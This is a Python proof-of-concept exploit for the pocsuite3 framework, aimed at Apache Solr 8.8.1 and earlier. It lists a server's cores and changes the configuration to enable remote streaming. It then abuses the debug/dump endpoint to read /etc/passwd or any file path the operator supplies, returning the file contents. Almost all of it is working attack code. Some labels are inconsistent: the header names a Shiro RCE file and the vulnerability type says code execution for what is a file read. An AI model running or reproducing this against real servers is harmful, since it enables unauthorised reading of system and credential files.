# -*- coding: utf-8 -*-
# Author:V1ZkRA
# Time:2021/4/13

# !/usr/bin/env python3
# @File    : poc_shiro_rce_2019.py

#!/usr/bin/env python
# coding: utf-8
from urllib.parse import urlparse,quote
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import POC_CATEGORY, VUL_TYPE
import json

class TestPOC(POCBase):
    vulID = 'ssvid-99160'
    version = '1'
    author = 'kingween'
    vulDate = '2021-3-18'
    createDate = '2021-3-19'
    updateDate = '2021-3-19'
    references = [
        'https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ']
    name = 'solr未授权导致任意文件读取'
    appPowerLink = ''
    appName = 'solr'
    appVersion = 'Apache Solr <= 8.8.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
        Apache Solr未授权导致任意文件读取
    '''
    def _options(self):
        o = OrderedDict()
        o["filename"] = OptString('', description='文件路径', require=False)
        return o

    def _verify(self):
        result = {}
        pr = urlparse(self.url)
        if pr.port:
            ports = [pr.port]
        else:
            ports = [8983]
        for port in ports:
            target = '{}://{}:{}'.format(pr.scheme, pr.hostname, port)
            # 获取core
            url1 = target + '/solr/admin/cores?indexInfo=false&wt=json'
            headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:73.0) Gecko/20100101 Firefox/73.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                       "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close", "Referer": self.url, "Upgrade-Insecure-Requests": "1"}
            response = req.get(url1, headers=headers,timeout=5)
            core_name = list(json.loads(response.text)["status"])[0]
            # 开启equestDispatcher.requestParsers.enableRemoteStreaming
            url2 = target + "/solr/" + core_name + "/config"
            headers = {"Content-type":"application/json"}
            data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
            response = req.get(url2, data=data,headers=headers, timeout=5)
            if 'responseHeader' in response.text and response.status_code == 200:
                # 读取文件
                url3 = target + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                data = 'stream.url=file:///etc/passwd'
                response = req.get(url3, data=data, headers=headers, timeout=5)
                if 'No such file or directory' not in response.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname, port)
                    break
        return self.parse_output(result)

    def _attack(self):
        result = {}
        pr = urlparse(self.url)
        if pr.port:
            ports = [pr.port]
        else:
            ports = [8983]
        for port in ports:
            target = '{}://{}:{}'.format(pr.scheme, pr.hostname, port)
            # 获取core
            url1 = target + '/solr/admin/cores?indexInfo=false&wt=json'
            headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:73.0) Gecko/20100101 Firefox/73.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                       "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close", "Referer": self.url, "Upgrade-Insecure-Requests": "1"}
            response = req.get(url1, headers=headers, timeout=10)
            core_name = list(json.loads(response.text)["status"])[0]
            # 开启equestDispatcher.requestParsers.enableRemoteStreaming
            url2 = target + "/solr/" + core_name + "/config"
            headers = {"Content-type":"application/json"}
            data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
            response = req.get(url2, data=data,headers=headers, timeout=5)
            if 'responseHeader' in response.text and response.status_code == 200:
                # 读取文件
                filename = self.get_option("filename")
                url3 = target + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                data = 'stream.url=file://{}'.format(filename)
                response = req.get(url3, data=data, headers=headers, timeout=5)
                if 'No such file or directory' not in response.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname, port)
                    result['extra'] = {}
                    result['extra']['evidence'] = response.text
                    break
        return self.parse_output(result)

    def _shell(self):
        return self._verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output

register_poc(TestPOC)